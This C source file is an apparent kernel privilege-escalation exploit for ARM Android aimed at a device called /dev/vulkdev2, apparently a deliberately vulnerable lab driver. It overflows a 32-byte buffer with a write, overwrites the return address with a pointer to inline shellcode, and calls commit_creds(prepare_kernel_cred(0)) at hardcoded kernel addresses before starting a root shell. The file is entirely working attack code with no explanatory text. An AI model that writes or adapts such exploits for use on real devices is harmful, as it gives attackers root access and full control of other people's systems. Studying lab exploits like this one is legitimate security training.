#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define VULKDEV_DEVICE "/dev/vulkdev2"
#define BUFF_SIZE 32

void payload(void)
{
	printf("exec root shell\n");
	execl("/system/bin/sh", "sh", NULL);
}

extern uint32_t shellcode[];
asm(
    "    .text\n"
    "    .align 2\n"
    "    .code 32\n"
    "    .globl shellcode\n\t"
    "shellcode:\n\t"
    // commit_creds(prepare_kernel_cred(0));
    "LDR     R3, =0xc003a89c\n\t" //prepare_kernel_cred addr
    "MOV     R0, #0\n\t"
    "BLX     R3\n\t"
    "LDR     R3, =0xc003a410\n\t" //commit_creds addr
    "BLX     R3\n\t"
    "mov     r3, #0x10\n\t"
    "MSR     CPSR_c,R3\n\t"
    "LDR     R3, =0x2a000759\n\t" //payload function addr
    "BLX     R3\n\t");

int main(int argc, char* argv[])
{
	int fd;
	char buf[64];
	void **pc;

	printf("payload = %p\n", payload);
	printf("shellcode = %p\n", shellcode);

	fd = open(VULKDEV_DEVICE, O_RDWR|O_NONBLOCK);
	if (fd == -1) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	pc = (void *)&buf[BUFF_SIZE + 4];
	*pc = (void *)shellcode;

	write(fd, buf, 48);
	close(fd);
	return 0;
}
